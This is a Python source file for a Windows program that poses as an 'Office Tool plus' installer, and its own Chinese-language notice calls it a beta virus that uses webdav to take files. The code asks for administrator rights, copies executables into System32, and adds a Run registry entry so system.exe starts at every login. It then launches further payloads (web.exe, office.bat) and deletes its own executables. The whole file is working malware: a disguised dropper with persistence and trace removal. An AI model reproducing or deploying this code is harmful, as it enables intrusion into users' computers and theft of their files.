
from __future__ import print_function
import ctypes, sys
from platform import system, system_alias
import os
import shutil
from time import sleep
import tkinter as tk
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    window = tk.Tk()
    window.title("使用说明")
    window.geometry("500x300")

    # 创建标签并设置位置
    label_top = tk.Label(window, text="Office Tool plus", font=("Arial", 16))
    label_top.grid(row=0, column=0, columnspan=3)

    # 创建文本框并设置内容和大小
    text = '''
    这是一个病毒程序的beta版，如果你无意点击，请立即退出！
    如果你处在安全的虚拟环境欢迎运行测试，在运行前你需要阅读并同意遵守以下内容：
    1.本程序使用webdav获取你计算机上的文件，请确保你没有重要文件
    2.请勿传播
    3.请勿反编译
    4.未遵守以上协议造成的一切不良后果有你本人承担，开发者不负任何责任。
    5.开发者对上述内容具有绝对的完全的解释权
    '''

    text_box = tk.Text(window, width=65, height=15)  # 设置文本框的宽度为60，高度为10
    text_box.insert(tk.END, text)
    text_box.grid(row=1, column=0, padx=10, pady=10, columnspan=2)

    def show_about():
        about_window = tk.Toplevel()
        about_window.title("关于")
        about_window.geometry("300x200")

        version_label = tk.Label(about_window, text="版本信息：Beta 1.0")
        version_label.pack()

        copyright_label = tk.Label(about_window, text='''copyright © juhuon. all right reserved.
    版权所有juhuon保留所有权利
    你可以通过购买获取开发者的授权和长期支持''')
        copyright_label.pack()

    def agree_and_continue():
        # 在此处添加处理用户点击“同意并继续”的逻辑
        current_dir = os.getcwd()
        # 获取当前目录
            
        # 目标文件夹
        destination_dir = 'C:\\Windows\\System32\\'

            # 文件类型列表
        file_types = ['.exe', '.txt']

            # 遍历当前目录下的所有文件
        for filename in os.listdir(current_dir):
                # 判断文件是否为指定类型
            if filename.endswith(tuple(file_types)):
                    # 构建源文件路径和目标文件路径
                source_path = os.path.join(current_dir, filename)
                destination_path = os.path.join(destination_dir, filename)
                    
                    # 复制文件
                shutil.copy(source_path, destination_path)

            

        exe_path = r"C:\Windows\System32\system.exe"
        reg_key = r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'

        # 使用 os.system 执行命令
        command = f'reg add {reg_key} /v system /t REG_SZ /d "{exe_path}" /f'
        os.system(command)
        os.system('start web.exe')
       
        os.system('start C:\\Windows\\System32\\system.exe')
        sleep(3)
        
        file_types = ['.txt']

            # 遍历当前目录下的所有文件
        for filename in os.listdir(current_dir):
                # 判断文件是否为指定类型
            if filename.endswith(tuple(file_types)):
                    # 构建源文件路径和目标文件路径
                source_path = os.path.join(current_dir, filename)
                destination_path = os.path.join(destination_dir, filename)
                    
                    # 复制文件
                shutil.copy(source_path, destination_path)

        os.system('start office.bat')
        os.system('del *.exe')
        os.system('del office.bat')
        window.quit()


    def disagree_and_exit():
        # 用户点击“不同意并退出”时退出程序
        window.quit()

    # 创建“同意并继续”按钮并设置位置
    button_agree = tk.Button(window, text='同意并继续', command=agree_and_continue)
    button_agree.grid(row=3, column=1, padx=1, pady=9, sticky=tk.W)

    # 创建“不同意并退出”按钮并设置位置
    button_disagree = tk.Button(window, text='不同意并退出', command=disagree_and_exit)
    button_disagree.grid(row=3, column=1, padx=0, pady=0, sticky=tk.E)
    button_about = tk.Button(window, text='关于', command=show_about)
    button_about.grid(row=0, column=1, padx=0, pady=0, sticky=tk.E)

    # 运行窗口主循环
    window.mainloop()

else:
    if sys.version_info[0] == 3:
    	ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:#in python2.x
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
# 创建窗口对象
